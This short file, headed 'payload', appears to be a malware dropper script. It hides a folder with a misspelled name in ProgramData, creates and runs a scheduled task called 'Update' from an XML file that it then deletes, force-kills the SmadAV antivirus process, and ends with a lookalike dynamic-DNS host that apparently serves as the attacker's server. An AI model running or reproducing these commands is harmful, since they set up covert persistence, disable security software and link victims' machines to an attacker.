# payload

mkdir %systemdrive%\ProgramData\updatewndows

schtasks /create /xml %systemdrive%\ProgramData\updatewndows\Update.xml /tn Update
del %systemdrive%\ProgramData\updatewndows\Update.xml
schtasks /run /tn Update

taskkill /F /IM SmadAV.exe
sc query | find "SmadAV"


googleapp.bounceme.net
